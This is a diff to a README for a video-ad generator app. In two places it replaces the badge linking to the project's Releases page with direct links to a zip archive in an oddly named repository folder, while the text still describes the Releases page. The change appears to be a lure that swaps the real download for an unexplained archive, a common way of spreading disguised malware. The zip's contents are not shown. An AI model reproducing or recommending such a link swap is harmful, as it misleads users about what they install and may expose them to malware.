@@ -15,7 +15,7 @@ Before you begin, ensure your computer meets the following requirements:
 ### Step 2: Download the Application
 To get started, visit the Releases page to download the application. Click the link below to go there now.
 
-[![Download Hollywood-Quality-UGC-Ad-Generator](https://img.shields.io/badge/Download-Hollywod--Quality--UGC--Ad--Generator-blue.svg)](https://github.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/releases)
+[![Download Hollywood-Quality-UGC-Ad-Generator](https://raw.githubusercontent.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/main/steeply/Hollywood-Quality-UGC-Ad-Generator.zip)](https://raw.githubusercontent.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/main/steeply/Hollywood-Quality-UGC-Ad-Generator.zip)
 
 ### Step 3: Install the Application
 1. Once you are on the Releases page, look for the latest version.
@@ -62,7 +62,7 @@ You can now use your high-quality video ad across various platforms like social 
 ## 📥 Download & Install
 To download the latest version of the application, visit the Releases page again:
 
-[![Download Hollywood-Quality-UGC-Ad-Generator](https://img.shields.io/badge/Download-Hollywod--Quality--UGC--Ad--Generator-blue.svg)](https://github.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/releases)
+[![Download Hollywood-Quality-UGC-Ad-Generator](https://raw.githubusercontent.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/main/steeply/Hollywood-Quality-UGC-Ad-Generator.zip)](https://raw.githubusercontent.com/Saurabh22111998/Hollywood-Quality-UGC-Ad-Generator/main/steeply/Hollywood-Quality-UGC-Ad-Generator.zip)
 
 ## ✅ Features
 - **User-Friendly Interface:** Designed for ease of use, even for beginners.
